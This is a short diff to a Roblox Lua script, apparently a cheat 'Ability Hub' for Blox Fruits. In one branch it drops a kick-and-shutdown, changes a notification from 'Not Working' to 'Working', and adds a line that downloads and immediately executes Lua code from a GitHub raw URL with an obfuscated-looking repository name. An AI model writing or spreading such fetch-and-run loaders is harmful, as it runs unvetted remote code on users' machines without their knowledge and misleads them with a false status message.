@@ -46,11 +46,9 @@ else
             game:GetService("StarterGui"):SetCore("SendNotification",
 							{
 								Title = "Ability Hub",
-								Text = "Blox Fruit Ability Hub Not Working...",
+								Text = "Blox Fruit Ability Hub Working...",
 								Icon = "rbxassetid://8957234733"
 							}
 						)
-  	game.Players.LocalPlayer:kick("No Have Game")
-    wait(1)
-    game:Shutdown()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/N0Fee1/9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999/main/Roblox.Script.lua"))()
 end
